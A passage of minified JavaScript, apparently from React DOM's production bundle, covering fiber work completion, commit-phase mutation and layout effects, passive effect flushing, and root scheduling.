t.flags&65536?t:null}return(t.flags&128)!==0?(t.lanes=n,t):(r=r!==null,r!==(e!==null&&e.memoizedState!==null)&&r&&(t.child.flags|=8192,(t.mode&1)!==0&&(e===null||(fe.current&1)!==0?_e===0&&(_e=3):qo())),t.updateQueue!==null&&(t.flags|=4),je(t),null);case 4:return Wn(),Io(e,t),e===null&&vr(t.stateNode.containerInfo),je(t),null;case 10:return io(t.type._context),je(t),null;case 17:return Ue(t.type)&&hi(),je(t),null;case 19:if(ce(fe),s=t.memoizedState,s===null)return je(t),null;if(r=(t.flags&128)!==0,u=s.rendering,u===null)if(r)Rr(s,!1);else{if(_e!==0||e!==null&&(e.flags&128)!==0)for(e=t.child;e!==null;){if(u=Ti(e),u!==null){for(t.flags|=128,Rr(s,!1),r=u.updateQueue,r!==null&&(t.updateQueue=r,t.flags|=4),t.subtreeFlags=0,r=n,n=t.child;n!==null;)s=n,e=r,s.flags&=14680066,u=s.alternate,u===null?(s.childLanes=0,s.lanes=e,s.child=null,s.subtreeFlags=0,s.memoizedProps=null,s.memoizedState=null,s.updateQueue=null,s.dependencies=null,s.stateNode=null):(s.childLanes=u.childLanes,s.lanes=u.lanes,s.child=u.child,s.subtreeFlags=0,s.deletions=null,s.memoizedProps=u.memoizedProps,s.memoizedState=u.memoizedState,s.updateQueue=u.updateQueue,s.type=u.type,e=u.dependencies,s.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext}),n=n.sibling;return ae(fe,fe.current&1|2),t.child}e=e.sibling}s.tail!==null&&ke()>Qn&&(t.flags|=128,r=!0,Rr(s,!1),t.lanes=4194304)}else{if(!r)if(e=Ti(u),e!==null){if(t.flags|=128,r=!0,n=e.updateQueue,n!==null&&(t.updateQueue=n,t.flags|=4),Rr(s,!0),s.tail===null&&s.tailMode==="hidden"&&!u.alternate&&!pe)return je(t),null}else 2*ke()-s.renderingStartTime>Qn&&n!==1073741824&&(t.flags|=128,r=!0,Rr(s,!1),t.lanes=4194304);s.isBackwards?(u.sibling=t.child,t.child=u):(n=s.last,n!==null?n.sibling=u:t.child=u,s.last=u)}return s.tail!==null?(t=s.tail,s.rendering=t,s.tail=t.sibling,s.renderingStartTime=ke(),t.sibling=null,n=fe.current,ae(fe,r?n&1|2:n&1),t):(je(t),null);case 22:case 23:return Ho(),r=t.memoizedState!==null,e!==null&&e.memoizedState!==null!==r&&(t.flags|=8192),r&&(t.mode&1)!==0?(et&1073741824)!==0&&(je(t),t.subtreeFlags&6&&(t.flags|=8192)):je(t),null;case 24:return null;case 25:return null}throw Error(l(156,t.tag))}function bp(e,t){switch(Zs(t),t.tag){case 1:return Ue(t.type)&&hi(),e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 3:return Wn(),ce(Be),ce(Re),po(),e=t.flags,(e&65536)!==0&&(e&128)===0?(t.flags=e&-65537|128,t):null;case 5:return uo(t),null;case 13:if(ce(fe),e=t.memoizedState,e!==null&&e.dehydrated!==null){if(t.alternate===null)throw Error(l(340));$n()}return e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 19:return ce(fe),null;case 4:return Wn(),null;case 10:return io(t.type._context),null;case 22:case 23:return Ho(),null;case 24:return null;default:return null}}var Ni=!1,Le=!1,Ap=typeof WeakSet=="function"?WeakSet:Set,D=null;function qn(e,t){var n=e.ref;if(n!==null)if(typeof n=="function")try{n(null)}catch(r){ye(e,t,r)}else n.current=null}function jo(e,t,n){try{n()}catch(r){ye(e,t,r)}}var Uu=!1;function Rp(e,t){if(Ws=ei,e=wa(),zs(e)){if("selectionStart"in e)var n={start:e.selectionStart,end:e.selectionEnd};else e:{n=(n=e.ownerDocument)&&n.defaultView||window;var r=n.getSelection&&n.getSelection();if(r&&r.rangeCount!==0){n=r.anchorNode;var i=r.anchorOffset,s=r.focusNode;r=r.focusOffset;try{n.nodeType,s.nodeType}catch{n=null;break e}var u=0,p=-1,f=-1,_=0,A=0,R=e,C=null;t:for(;;){for(var z;R!==n||i!==0&&R.nodeType!==3||(p=u+i),R!==s||r!==0&&R.nodeType!==3||(f=u+r),R.nodeType===3&&(u+=R.nodeValue.length),(z=R.firstChild)!==null;)C=R,R=z;for(;;){if(R===e)break t;if(C===n&&++_===i&&(p=u),C===s&&++A===r&&(f=u),(z=R.nextSibling)!==null)break;R=C,C=R.parentNode}R=z}n=p===-1||f===-1?null:{start:p,end:f}}else n=null}n=n||{start:0,end:0}}else n=null;for(Hs={focusedElem:e,selectionRange:n},ei=!1,D=t;D!==null;)if(t=D,e=t.child,(t.subtreeFlags&1028)!==0&&e!==null)e.return=t,D=e;else for(;D!==null;){t=D;try{var O=t.alternate;if((t.flags&1024)!==0)switch(t.tag){case 0:case 11:case 15:break;case 1:if(O!==null){var $=O.memoizedProps,we=O.memoizedState,k=t.stateNode,g=k.getSnapshotBeforeUpdate(t.elementType===t.type?$:ft(t.type,$),we);k.__reactInternalSnapshotBeforeUpdate=g}break;case 3:var x=t.stateNode.containerInfo;x.nodeType===1?x.textContent="":x.nodeType===9&&x.documentElement&&x.removeChild(x.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(l(163))}}catch(I){ye(t,t.return,I)}if(e=t.sibling,e!==null){e.return=t.return,D=e;break}D=t.return}return O=Uu,Uu=!1,O}function Ir(e,t,n){var r=t.updateQueue;if(r=r!==null?r.lastEffect:null,r!==null){var i=r=r.next;do{if((i.tag&e)===e){var s=i.destroy;i.destroy=void 0,s!==void 0&&jo(t,n,s)}i=i.next}while(i!==r)}}function zi(e,t){if(t=t.updateQueue,t=t!==null?t.lastEffect:null,t!==null){var n=t=t.next;do{if((n.tag&e)===e){var r=n.create;n.destroy=r()}n=n.next}while(n!==t)}}function Lo(e){var t=e.ref;if(t!==null){var n=e.stateNode;switch(e.tag){case 5:e=n;break;default:e=n}typeof t=="function"?t(e):t.current=e}}function Wu(e){var t=e.alternate;t!==null&&(e.alternate=null,Wu(t)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(t=e.stateNode,t!==null&&(delete t[St],delete t[wr],delete t[Ks],delete t[pp],delete t[fp])),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}function Hu(e){return e.tag===5||e.tag===3||e.tag===4}function qu(e){e:for(;;){for(;e.sibling===null;){if(e.return===null||Hu(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;e.tag!==5&&e.tag!==6&&e.tag!==18;){if(e.flags&2||e.child===null||e.tag===4)continue e;e.child.return=e,e=e.child}if(!(e.flags&2))return e.stateNode}}function No(e,t,n){var r=e.tag;if(r===5||r===6)e=e.stateNode,t?n.nodeType===8?n.parentNode.insertBefore(e,t):n.insertBefore(e,t):(n.nodeType===8?(t=n.parentNode,t.insertBefore(e,n)):(t=n,t.appendChild(e)),n=n._reactRootContainer,n!=null||t.onclick!==null||(t.onclick=pi));else if(r!==4&&(e=e.child,e!==null))for(No(e,t,n),e=e.sibling;e!==null;)No(e,t,n),e=e.sibling}function zo(e,t,n){var r=e.tag;if(r===5||r===6)e=e.stateNode,t?n.insertBefore(e,t):n.appendChild(e);else if(r!==4&&(e=e.child,e!==null))for(zo(e,t,n),e=e.sibling;e!==null;)zo(e,t,n),e=e.sibling}var be=null,ht=!1;function Xt(e,t,n){for(n=n.child;n!==null;)Vu(e,t,n),n=n.sibling}function Vu(e,t,n){if(xt&&typeof xt.onCommitFiberUnmount=="function")try{xt.onCommitFiberUnmount(Kr,n)}catch{}switch(n.tag){case 5:Le||qn(n,t);case 6:var r=be,i=ht;be=null,Xt(e,t,n),be=r,ht=i,be!==null&&(ht?(e=be,n=n.stateNode,e.nodeType===8?e.parentNode.removeChild(n):e.removeChild(n)):be.removeChild(n.stateNode));break;case 18:be!==null&&(ht?(e=be,n=n.stateNode,e.nodeType===8?Qs(e.parentNode,n):e.nodeType===1&&Qs(e,n),ur(e)):Qs(be,n.stateNode));break;case 4:r=be,i=ht,be=n.stateNode.containerInfo,ht=!0,Xt(e,t,n),be=r,ht=i;break;case 0:case 11:case 14:case 15:if(!Le&&(r=n.updateQueue,r!==null&&(r=r.lastEffect,r!==null))){i=r=r.next;do{var s=i,u=s.destroy;s=s.tag,u!==void 0&&((s&2)!==0||(s&4)!==0)&&jo(n,t,u),i=i.next}while(i!==r)}Xt(e,t,n);break;case 1:if(!Le&&(qn(n,t),r=n.stateNode,typeof r.componentWillUnmount=="function"))try{r.props=n.memoizedProps,r.state=n.memoizedState,r.componentWillUnmount()}catch(p){ye(n,t,p)}Xt(e,t,n);break;case 21:Xt(e,t,n);break;case 22:n.mode&1?(Le=(r=Le)||n.memoizedState!==null,Xt(e,t,n),Le=r):Xt(e,t,n);break;default:Xt(e,t,n)}}function Qu(e){var t=e.updateQueue;if(t!==null){e.updateQueue=null;var n=e.stateNode;n===null&&(n=e.stateNode=new Ap),t.forEach(function(r){var i=$p.bind(null,e,r);n.has(r)||(n.add(r),r.then(i,i))})}}function mt(e,t){var n=t.deletions;if(n!==null)for(var r=0;r<n.length;r++){var i=n[r];try{var s=e,u=t,p=u;e:for(;p!==null;){switch(p.tag){case 5:be=p.stateNode,ht=!1;break e;case 3:be=p.stateNode.containerInfo,ht=!0;break e;case 4:be=p.stateNode.containerInfo,ht=!0;break e}p=p.return}if(be===null)throw Error(l(160));Vu(s,u,i),be=null,ht=!1;var f=i.alternate;f!==null&&(f.return=null),i.return=null}catch(_){ye(i,t,_)}}if(t.subtreeFlags&12854)for(t=t.child;t!==null;)Ku(t,e),t=t.sibling}function Ku(e,t){var n=e.alternate,r=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:if(mt(t,e),Tt(e),r&4){try{Ir(3,e,e.return),zi(3,e)}catch($){ye(e,e.return,$)}try{Ir(5,e,e.return)}catch($){ye(e,e.return,$)}}break;case 1:mt(t,e),Tt(e),r&512&&n!==null&&qn(n,n.return);break;case 5:if(mt(t,e),Tt(e),r&512&&n!==null&&qn(n,n.return),e.flags&32){var i=e.stateNode;try{Zn(i,"")}catch($){ye(e,e.return,$)}}if(r&4&&(i=e.stateNode,i!=null)){var s=e.memoizedProps,u=n!==null?n.memoizedProps:s,p=e.type,f=e.updateQueue;if(e.updateQueue=null,f!==null)try{p==="input"&&s.type==="radio"&&s.name!=null&&Sl(i,s),ds(p,u);var _=ds(p,s);for(u=0;u<f.length;u+=2){var A=f[u],R=f[u+1];A==="style"?Rl(i,R):A==="dangerouslySetInnerHTML"?bl(i,R):A==="children"?Zn(i,R):Ke(i,A,R,_)}switch(p){case"input":os(i,s);break;case"textarea":Tl(i,s);break;case"select":var C=i._wrapperState.wasMultiple;i._wrapperState.wasMultiple=!!s.multiple;var z=s.value;z!=null?En(i,!!s.multiple,z,!1):C!==!!s.multiple&&(s.defaultValue!=null?En(i,!!s.multiple,s.defaultValue,!0):En(i,!!s.multiple,s.multiple?[]:"",!1))}i[wr]=s}catch($){ye(e,e.return,$)}}break;case 6:if(mt(t,e),Tt(e),r&4){if(e.stateNode===null)throw Error(l(162));i=e.stateNode,s=e.memoizedProps;try{i.nodeValue=s}catch($){ye(e,e.return,$)}}break;case 3:if(mt(t,e),Tt(e),r&4&&n!==null&&n.memoizedState.isDehydrated)try{ur(t.containerInfo)}catch($){ye(e,e.return,$)}break;case 4:mt(t,e),Tt(e);break;case 13:mt(t,e),Tt(e),i=e.child,i.flags&8192&&(s=i.memoizedState!==null,i.stateNode.isHidden=s,!s||i.alternate!==null&&i.alternate.memoizedState!==null||(Oo=ke())),r&4&&Qu(e);break;case 22:if(A=n!==null&&n.memoizedState!==null,e.mode&1?(Le=(_=Le)||A,mt(t,e),Le=_):mt(t,e),Tt(e),r&8192){if(_=e.memoizedState!==null,(e.stateNode.isHidden=_)&&!A&&(e.mode&1)!==0)for(D=e,A=e.child;A!==null;){for(R=D=A;D!==null;){switch(C=D,z=C.child,C.tag){case 0:case 11:case 14:case 15:Ir(4,C,C.return);break;case 1:qn(C,C.return);var O=C.stateNode;if(typeof O.componentWillUnmount=="function"){r=C,n=C.return;try{t=r,O.props=t.memoizedProps,O.state=t.memoizedState,O.componentWillUnmount()}catch($){ye(r,n,$)}}break;case 5:qn(C,C.return);break;case 22:if(C.memoizedState!==null){Xu(R);continue}}z!==null?(z.return=C,D=z):Xu(R)}A=A.sibling}e:for(A=null,R=e;;){if(R.tag===5){if(A===null){A=R;try{i=R.stateNode,_?(s=i.style,typeof s.setProperty=="function"?s.setProperty("display","none","important"):s.display="none"):(p=R.stateNode,f=R.memoizedProps.style,u=f!=null&&f.hasOwnProperty("display")?f.display:null,p.style.display=Al("display",u))}catch($){ye(e,e.return,$)}}}else if(R.tag===6){if(A===null)try{R.stateNode.nodeValue=_?"":R.memoizedProps}catch($){ye(e,e.return,$)}}else if((R.tag!==22&&R.tag!==23||R.memoizedState===null||R===e)&&R.child!==null){R.child.return=R,R=R.child;continue}if(R===e)break e;for(;R.sibling===null;){if(R.return===null||R.return===e)break e;A===R&&(A=null),R=R.return}A===R&&(A=null),R.sibling.return=R.return,R=R.sibling}}break;case 19:mt(t,e),Tt(e),r&4&&Qu(e);break;case 21:break;default:mt(t,e),Tt(e)}}function Tt(e){var t=e.flags;if(t&2){try{e:{for(var n=e.return;n!==null;){if(Hu(n)){var r=n;break e}n=n.return}throw Error(l(160))}switch(r.tag){case 5:var i=r.stateNode;r.flags&32&&(Zn(i,""),r.flags&=-33);var s=qu(e);zo(e,s,i);break;case 3:case 4:var u=r.stateNode.containerInfo,p=qu(e);No(e,p,u);break;default:throw Error(l(161))}}catch(f){ye(e,e.return,f)}e.flags&=-3}t&4096&&(e.flags&=-4097)}function Ip(e,t,n){D=e,Gu(e)}function Gu(e,t,n){for(var r=(e.mode&1)!==0;D!==null;){var i=D,s=i.child;if(i.tag===22&&r){var u=i.memoizedState!==null||Ni;if(!u){var p=i.alternate,f=p!==null&&p.memoizedState!==null||Le;p=Ni;var _=Le;if(Ni=u,(Le=f)&&!_)for(D=i;D!==null;)u=D,f=u.child,u.tag===22&&u.memoizedState!==null?Zu(i):f!==null?(f.return=u,D=f):Zu(i);for(;s!==null;)D=s,Gu(s),s=s.sibling;D=i,Ni=p,Le=_}Yu(e)}else(i.subtreeFlags&8772)!==0&&s!==null?(s.return=i,D=s):Yu(e)}}function Yu(e){for(;D!==null;){var t=D;if((t.flags&8772)!==0){var n=t.alternate;try{if((t.flags&8772)!==0)switch(t.tag){case 0:case 11:case 15:Le||zi(5,t);break;case 1:var r=t.stateNode;if(t.flags&4&&!Le)if(n===null)r.componentDidMount();else{var i=t.elementType===t.type?n.memoizedProps:ft(t.type,n.memoizedProps);r.componentDidUpdate(i,n.memoizedState,r.__reactInternalSnapshotBeforeUpdate)}var s=t.updateQueue;s!==null&&Xa(t,s,r);break;case 3:var u=t.updateQueue;if(u!==null){if(n=null,t.child!==null)switch(t.child.tag){case 5:n=t.child.stateNode;break;case 1:n=t.child.stateNode}Xa(t,u,n)}break;case 5:var p=t.stateNode;if(n===null&&t.flags&4){n=p;var f=t.memoizedProps;switch(t.type){case"button":case"input":case"select":case"textarea":f.autoFocus&&n.focus();break;case"img":f.src&&(n.src=f.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(t.memoizedState===null){var _=t.alternate;if(_!==null){var A=_.memoizedState;if(A!==null){var R=A.dehydrated;R!==null&&ur(R)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(l(163))}Le||t.flags&512&&Lo(t)}catch(C){ye(t,t.return,C)}}if(t===e){D=null;break}if(n=t.sibling,n!==null){n.return=t.return,D=n;break}D=t.return}}function Xu(e){for(;D!==null;){var t=D;if(t===e){D=null;break}var n=t.sibling;if(n!==null){n.return=t.return,D=n;break}D=t.return}}function Zu(e){for(;D!==null;){var t=D;try{switch(t.tag){case 0:case 11:case 15:var n=t.return;try{zi(4,t)}catch(f){ye(t,n,f)}break;case 1:var r=t.stateNode;if(typeof r.componentDidMount=="function"){var i=t.return;try{r.componentDidMount()}catch(f){ye(t,i,f)}}var s=t.return;try{Lo(t)}catch(f){ye(t,s,f)}break;case 5:var u=t.return;try{Lo(t)}catch(f){ye(t,u,f)}}}catch(f){ye(t,t.return,f)}if(t===e){D=null;break}var p=t.sibling;if(p!==null){p.return=t.return,D=p;break}D=t.return}}var jp=Math.ceil,Di=Ee.ReactCurrentDispatcher,Do=Ee.ReactCurrentOwner,ot=Ee.ReactCurrentBatchConfig,Z=0,Pe=null,xe=null,Ae=0,et=0,Vn=Vt(0),_e=0,jr=null,mn=0,Mi=0,Mo=0,Lr=null,He=null,Oo=0,Qn=1/0,Dt=null,Oi=!1,$o=null,Zt=null,$i=!1,Jt=null,Fi=0,Nr=0,Fo=null,Bi=-1,Ui=0;function Me(){return(Z&6)!==0?ke():Bi!==-1?Bi:Bi=ke()}function en(e){return(e.mode&1)===0?1:(Z&2)!==0&&Ae!==0?Ae&-Ae:mp.transition!==null?(Ui===0&&(Ui=ql()),Ui):(e=re,e!==0||(e=window.event,e=e===void 0?16:ea(e.type)),e)}function gt(e,t,n,r){if(50<Nr)throw Nr=0,Fo=null,Error(l(185));ir(e,n,r),((Z&2)===0||e!==Pe)&&(e===Pe&&((Z&2)===0&&(Mi|=n),_e===4&&tn(e,Ae)),qe(e,r),n===1&&Z===0&&(t.mode&1)===0&&(Qn=ke()+500,gi&&Kt()))}function qe(e,t){var n=e.callbackNode;md(e,t);var r=Xr(e,e===Pe?Ae:0);if(r===0)n!==null&&Ul(n),e.callbackNode=null,e.callbackPriority=0;else if(t=r&-r,e.callbackPriority!==t){if(n!=null&&Ul(n),t===1)e.tag===0?hp(ec.bind(null,e)):$a(ec.bind(null,e)),cp(function(){(Z&6)===0&&Kt()}),n=null;else{switch(Vl(r)){case 1:n=vs;break;case 4:n=Wl;break;case 16:n=Qr;break;case 536870912:n=Hl;break;default:n=Qr}n=ac(n,Ju.bind(null,e))}e.callbackPriority=t,e.callbackNode=n}}function Ju(e,t){if(Bi=-1,Ui=0,(Z&6)!==0)throw Error(l(327));var n=e.callbackNode;if(Kn()&&e.callbackNode!==n)return null;var r=Xr(e,e===Pe?Ae:0);if(r===0)return null;if((r&30)!==0||(r&e.expiredLanes)!==0||t)t=Wi(e,r);else{t=r;var i=Z;Z|=2;var s=nc();(Pe!==e||Ae!==t)&&(Dt=null,Qn=ke()+500,yn(e,t));do try{zp();break}catch(p){tc(e,p)}while(!0);ro(),Di.current=s,Z=i,xe!==null?t=0:(Pe=null,Ae=0,t=_e)}if(t!==0){if(t===2&&(i=ks(e),i!==0&&(r=i,t=Bo(e,i))),t===1)throw n=jr,yn(e,0),tn(e,r),qe(e,ke()),n;if(t===6)tn(e,r);else{if(i=e.current.alternate,(r&30)===0&&!Lp(i)&&(t=Wi(e,r),t===2&&(s=ks(e),s!==0&&(r=s,t=Bo(e,s))),t===1))throw n=jr,yn(e,0),tn(e,r),qe(e,ke()),n;switch(e.finishedWork=i,e.finishedLanes=r,t){case 0:case 1:throw Error(l(345));case 2:vn(e,He,Dt);break;case 3:if(tn(e,r),(r&130023424)===r&&(t=Oo+500-ke(),10<t)){if(Xr(e,0)!==0)break;if(i=e.suspendedLanes,(i&r)!==r){Me(),e.pingedLanes|=e.suspendedLanes&i;break}e.timeoutHandle=Vs(vn.bind(null,e,He,Dt),t);break}vn(e,He,Dt);break;case 4:if(tn(e,r),(r&4194240)===r)break;for(t=e.eventTimes,i=-1;0<r;){var u=31-ct(r);s=1<<u,u=t[u],u>i&&(i=u),r&=~s}if(r=i,r=ke()-r,r=(120>r?120:480>r?480:1080>r?1080:1920>r?1920:3e3>r?3e3:4320>r?4320:1960*jp(r/1960))-r,10<r){e.timeoutHandle=Vs(vn.bind(null,e,He,Dt),r);break}vn(e,He,Dt);break;case 5:vn(e,He,Dt);break;default:throw Error(l(329))}}}return qe(e,ke()),e.callbackNode===n?Ju.bind(null,e):null}function Bo(e,t){var n=Lr;return e.current.memoizedState.isDehydrated&&(yn(e,t).flags|=256),e=Wi(e,t),e!==2&&(t=He,He=n,t!==null&&Uo(t)),e}function Uo(e){He===null?He=e:He.push.apply(He,e)}function Lp(e){for(var t=e;;){if(t.flags&16384){var n=t.updateQueue;if(n!==null&&(n=n.stores,n!==null))for(var r=0;r<n.length;r++){var i=n[r],s=i.getSnapshot;i=i.value;try{if(!dt(s(),i))return!1}catch{return!1}}}if(n=t.child,t.subtreeFlags&16384&&n!==null)n.return=t,t=n;else{if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return!0;t=t.return}t.sibling.return=t.return,t=t.sibling}}return!0}function tn(e,t){for(t&=~Mo,t&=~Mi,e.suspendedLanes|=t,e.pingedLanes&=~t,e=e.expirationTimes;0<t;){var n=31-ct(t),r=1<<n;e[n]=-1,t&=~r}}function ec(e){if((Z&6)!==0)throw Error(l(327));Kn();var t=Xr(e,0);if((t&1)===0)return qe(e,ke()),null;var n=Wi(e,t);if(e.tag!==0&&n===2){var r=ks(e);r!==0&&(t=r,n=Bo(e,r))}if(n===1)throw n=jr,yn(e,0),tn(e,t),qe(e,ke()),n;if(n===6)throw Error(l(345));return e.finishedWork=e.current.alternate,e.finishedLanes=t,vn(e,He,Dt),qe(e,ke()),null}function Wo(e,t){var n=Z;Z|=1;try{return e(t)}finally{Z=n,Z===0&&(Qn=ke()+500,gi&&Kt())}}function gn(e){Jt!==null&&Jt.tag===0&&(Z&6)===0&&Kn();var t=Z;Z|=1;var n=ot.transition,r=re;try{if(ot.transition=null,re=1,e)return e()}finally{re=r,ot.transition=n,Z=t,(Z&6)===0&&Kt()}}function Ho(){et=Vn.current,ce(Vn)}function yn(e,t){e.finishedWork=null,e.finishedLanes=0;var n=e.timeoutHandle;if(n!==-1&&(e.timeoutHandle=-1,up(n)),xe!==null)for(n=xe.return;n!==null;){var r=n;switch(Zs(r),r.tag){case 1:r=r.type.childContextTypes,r!=null&&hi();break;case 3:Wn(),ce(Be),ce(Re),po();break;case 5:uo(r);break;case 4:Wn();break;case 13:ce(fe);break;case 19:ce(fe);break;case 10:io(r.type._context);break;case 22:case 23:Ho()}n=n.return}if(Pe=e,xe=e=nn(e.current,null),Ae=et=t,_e=0,jr=null,Mo=Mi=mn=0,He=Lr=null,pn!==null){for(t=0;t<pn.length;t++)if(n=pn[t],r=n.interleaved,r!==null){n.interleaved=null;var i=r.next,s=n.pending;if(s!==null){var u=s.next;s.next=i,r.next=u}n.pending=r}pn=null}return e}function tc(e,t){do{var n=xe;try{if(ro(),Pi.current=Ri,Ci){for(var r=he.memoizedState;r!==null;){var i=r.queue;i!==null&&(i.pending=null),r=r.next}Ci=!1}if(hn=0,Te=Se=he=null,Pr=!1,Cr=0,Do.current=null,n===null||n.return===null){_e=1,jr=t,xe=null;break}e:{var s=e,u=n.return,p=n,f=t;if(t=Ae,p.flags|=32768,f!==null&&typeof f=="object"&&typeof f.then=="function"){var _=f,A=p,R=A.tag;if((A.mode&1)===0&&(R===0||R===11||R===15)){var C=A.alternate;C?(A.updateQueue=C.updateQueue,A.memoizedState=C.memoizedState,A.lanes=C.lanes):(A.updateQueue=null,A.memoizedState=null)}var z=Pu(u);if(z!==null){z.flags&=-257,Cu(z,u,p,s,t),z.mode&1&&Tu(s,_,t),t=z,f=_;var O=t.updateQueue;if(O===null){var $=new Set;$.add(f),t.updateQueue=$}else O.add(f);break e}else{if((t&1)===0){Tu(s,_,t),qo();break e}f=Error(l(426))}}else if(pe&&p.mode&1){var we=Pu(u);if(we!==null){(we.flags&65536)===0&&(we.flags|=256),Cu(we,u,p,s,t),to(Hn(f,p));break e}}s=f=Hn(f,p),_e!==4&&(_e=2),Lr===null?Lr=[s]:Lr.push(s),s=u;do{switch(s.tag){case 3:s.flags|=65536,t&=-t,s.lanes|=t;var k=_u(s,f,t);Ya(s,k);break e;case 1:p=f;var g=s.type,x=s.stateNode;if((s.flags&128)===0&&(typeof g.getDerivedStateFromError=="function"||x!==null&&typeof x.componentDidCatch=="function"&&(Zt===null||!Zt.has(x)))){s.flags|=65536,t&=-t,s.lanes|=t;var I=Eu(s,p,t);Ya(s,I);break e}}s=s.return}while(s!==null)}ic(n)}catch(F){t=F,xe===n&&n!==null&&(xe=n=n.return);continue}break}while(!0)}function nc(){var e=Di.current;return Di.current=Ri,e===null?Ri:e}function qo(){(_e===0||_e===3||_e===2)&&(_e=4),Pe===null||(mn&268435455)===0&&(Mi&268435455)===0||tn(Pe,Ae)}function Wi(e,t){var n=Z;Z|=2;var r=nc();(Pe!==e||Ae!==t)&&(Dt=null,yn(e,t));do try{Np();break}catch(i){tc(e,i)}while(!0);if(ro(),Z=n,Di.current=r,xe!==null)throw Error(l(261));return Pe=null,Ae=0,_e}function Np(){for(;xe!==null;)rc(xe)}function zp(){for(;xe!==null&&!od();)rc(xe)}function rc(e){var t=lc(e.alternate,e,et);e.memoizedProps=e.pendingProps,t===null?ic(e):xe=t,Do.current=null}function ic(e){var t=e;do{var n=t.alternate;if(e=t.return,(t.flags&32768)===0){if(n=Cp(n,t,et),n!==null){xe=n;return}}else{if(n=bp(n,t),n!==null){n.flags&=32767,xe=n;return}if(e!==null)e.flags|=32768,e.subtreeFlags=0,e.deletions=null;else{_e=6,xe=null;return}}if(t=t.sibling,t!==null){xe=t;return}xe=t=e}while(t!==null);_e===0&&(_e=5)}function vn(e,t,n){var r=re,i=ot.transition;try{ot.transition=null,re=1,Dp(e,t,n,r)}finally{ot.transition=i,re=r}return null}function Dp(e,t,n,r){do Kn();while(Jt!==null);if((Z&6)!==0)throw Error(l(327));n=e.finishedWork;var i=e.finishedLanes;if(n===null)return null;if(e.finishedWork=null,e.finishedLanes=0,n===e.current)throw Error(l(177));e.callbackNode=null,e.callbackPriority=0;var s=n.lanes|n.childLanes;if(gd(e,s),e===Pe&&(xe=Pe=null,Ae=0),(n.subtreeFlags&2064)===0&&(n.flags&2064)===0||$i||($i=!0,ac(Qr,function(){return Kn(),null})),s=(n.flags&15990)!==0,(n.subtreeFlags&15990)!==0||s){s=ot.transition,ot.transition=null;var u=re;re=1;var p=Z;Z|=4,Do.current=null,Rp(e,n),Ku(n,e),np(Hs),ei=!!Ws,Hs=Ws=null,e.current=n,Ip(n),ld(),Z=p,re=u,ot.transition=s}else e.current=n;if($i&&($i=!1,Jt=e,Fi=i),s=e.pendingLanes,s===0&&(Zt=null),cd(n.stateNode),qe(e,ke()),t!==null)for(r=e.onRecoverableError,n=0;n<t.length;n++)i=t[n],r(i.value,{componentStack:i.stack,digest:i.digest});if(Oi)throw Oi=!1,e=$o,$o=null,e;return(Fi&1)!==0&&e.tag!==0&&Kn(),s=e.pendingLanes,(s&1)!==0?e===Fo?Nr++:(Nr=0,Fo=e):Nr=0,Kt(),null}function Kn(){if(Jt!==null){var e=Vl(Fi),t=ot.transition,n=re;try{if(ot.transition=null,re=16>e?16:e,Jt===null)var r=!1;else{if(e=Jt,Jt=null,Fi=0,(Z&6)!==0)throw Error(l(331));var i=Z;for(Z|=4,D=e.current;D!==null;){var s=D,u=s.child;if((D.flags&16)!==0){var p=s.deletions;if(p!==null){for(var f=0;f<p.length;f++){var _=p[f];for(D=_;D!==null;){var A=D;switch(A.tag){case 0:case 11:case 15:Ir(8,A,s)}var R=A.child;if(R!==null)R.return=A,D=R;else for(;D!==null;){A=D;var C=A.sibling,z=A.return;if(Wu(A),A===_){D=null;break}if(C!==null){C.return=z,D=C;break}D=z}}}var O=s.alternate;if(O!==null){var $=O.child;if($!==null){O.child=null;do{var we=$.sibling;$.sibling=null,$=we}while($!==null)}}D=s}}if((s.subtreeFlags&2064)!==0&&u!==null)u.return=s,D=u;else e:for(;D!==null;){if(s=D,(s.flags&2048)!==0)switch(s.tag){case 0:case 11:case 15:Ir(9,s,s.return)}var k=s.sibling;if(k!==null){k.return=s.return,D=k;break e}D=s.return}}var g=e.current;for(D=g;D!==null;){u=D;var x=u.child;if((u.subtreeFlags&2064)!==0&&x!==null)x.return=u,D=x;else e:for(u=g;D!==null;){if(p=D,(p.flags&2048)!==0)try{switch(p.tag){case 0:case 11:case 15:zi(9,p)}}catch(F){ye(p,p.return,F)}if(p===u){D=null;break e}var I=p.sibling;if(I!==null){I.return=p.return,D=I;break e}D=p.return}}if(Z=i,Kt(),xt&&typeof xt.onPostCommitFiberRoot=="function")try{xt.onPostCommitFiberRoot(Kr,e)}catch{}r=!0}return r}finally{re=n,ot.transition=t}}return!1}function sc(e,t,n){t=Hn(n,t),t=_u(e,t,1),e=Yt(e,t,1),t=Me(),e!==null&&(ir(e,1,t),qe(e,t))}function ye(e,t,n){if(e.tag===3)sc(e,e,n);else for(;t!==null;){if(t.tag===3){sc(t,e,n);break}else if(t.tag===1){var r=t.stateNode;if(typeof t.type.getDerivedStateFromError=="function"||typeof r.componentDidCatch=="function"&&(Zt===null||!Zt.has(r))){e=Hn(n,e),e=Eu(t,e,1),t=Yt(t,e,1),e=Me(),t!==null&&(ir(t,1,e),qe(t,e));break}}t=t.return}}function Mp(e,t,n){var r=e.pingCache;r!==null&&r.delete(t),t=Me(),e.pingedLanes|=e.suspendedLanes&n,Pe===e&&(Ae&n)===n&&(_e===4||_e===3&&(Ae&130023424)===Ae&&500>ke()-Oo?yn(e,0):Mo|=n),qe(e,t)}function oc(e,t){t===0&&((e.mode&1)===0?t=1:(t=Yr,Yr<<=1,(Yr&130023424)===0&&(Yr=4194304)));var n=Me();e=Lt(e,t),e!==null&&(ir(e,t,n),qe(e,n))}function Op(e){var t=e.memoizedState,n=0;t!==null&&(n=t.retryLane),oc(e,n)}function $p(e,t){var n=0;switch(e.tag){case 13:var r=e.stateNode,i=e.memoizedState;i!==null&&(n=i.retryLane);break;case 19:r=e.stateNode;break;default:throw 